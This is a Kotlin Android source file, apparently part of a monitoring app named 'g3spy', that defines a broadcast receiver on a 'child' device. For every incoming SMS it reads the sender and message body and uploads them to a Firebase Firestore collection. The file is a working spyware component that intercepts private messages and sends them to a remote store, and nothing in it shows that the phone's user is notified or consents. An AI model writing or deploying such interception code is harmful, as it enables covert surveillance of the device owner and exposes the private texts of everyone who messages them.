package com.g3spy.child.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.g3spy.child.services.SmsService
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import java.util.*

/**
 * Broadcast receiver that intercepts incoming SMS messages
 */
class SmsReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "SmsReceiver"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            Log.d(TAG, "SMS received")
            
            // Start the SMS service if not already running
            val serviceIntent = Intent(context, SmsService::class.java)
            context.startService(serviceIntent)
            
            // Process SMS directly for immediate capture
            processSms(context, intent)
        }
    }
    
    private fun processSms(context: Context, intent: Intent) {
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val firestore = FirebaseFirestore.getInstance()
        
        for (message in messages) {
            val sender = message.displayOriginatingAddress
            val body = message.displayMessageBody
            val timestamp = System.currentTimeMillis()
            
            Log.d(TAG, "Processing SMS from $sender")
            
            // Upload to Firebase
            val smsData = hashMapOf(
                "sender" to sender,
                "recipient" to "ME",
                "content" to body,
                "timestamp" to Timestamp(Date(timestamp)),
                "isIncoming" to true
            )
            
            firestore.collection("sms_messages")
                .add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d(TAG, "SMS uploaded with ID: ${documentReference.id}")
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Error uploading SMS", e)
                }
        }
    }
}